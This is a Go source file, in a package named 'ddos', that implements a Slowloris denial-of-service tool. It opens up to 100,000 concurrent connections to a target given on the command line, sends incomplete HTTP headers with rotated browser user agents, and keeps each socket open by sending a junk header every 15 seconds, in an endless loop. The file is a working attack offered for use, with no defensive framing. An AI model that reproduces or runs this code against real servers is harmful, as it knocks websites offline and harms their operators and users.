package ddos

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/jasonlvhit/gocron"
)

var headers = []string{
	"GET / HTTP/1.1\r\n",
	"",
	"Accept-language: en-US,en,q=0.5\r\n",
	"Connection: Keep-Alive\r\n",
}
var choice = []string{
	"User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\r\n",
	"User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n",
	"User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\r\n",
}

func slowloris(url string) {
	conn, err := net.DialTimeout("tcp", url, 2*time.Second)
	if err != nil {
		return
	}
	headers[1] = choice[rand.Intn(len(choice))]
	for _, header := range headers {
		_, err = fmt.Fprint(conn, header)
	}
	for {
		_, err = fmt.Fprintf(conn, "X-a: %v\r\n", rand.Intn(5000))
		if err != nil {
			defer slowloris(url)
			return
		}
		time.Sleep(15 * time.Second)
	}
}

func main() {
	attackers := 100000
	url := os.Args[1]
	x := randomNumber()
	fmt.Print("Waiting: ", x)
	time.Sleep(time.Duration(x) * time.Second)
	for {
		for i := 0; i < attackers; i++ {
			go slowloris(url)
		}
		time.Sleep(100 * time.Second)
		gocron.Remove(slowloris)
	}
}

func randomNumber() int {
	rand.Seed(time.Now().UnixNano())
	min := 1
	max := 15
	return rand.Intn(max-min+1) + min
}
